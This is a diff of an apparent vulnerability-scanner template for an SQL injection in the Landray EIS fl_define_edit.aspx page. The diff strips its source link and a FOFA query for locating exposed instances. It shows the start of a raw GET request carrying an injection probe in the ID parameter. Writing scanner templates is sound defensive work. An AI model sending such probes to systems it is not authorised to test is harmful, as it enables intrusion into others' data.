@@ -3,12 +3,8 @@ info:
   name: 蓝凌EIS fl_define_edit.aspx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gsg54gn4xgo253l9'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gsg54gn4xgo253l9
-    fofa: app="Landray-EIS智慧协同平台"
 http:
 - raw:
   - 'GET /flow/fl_define_edit.aspx?ID=1-user HTTP/1.1
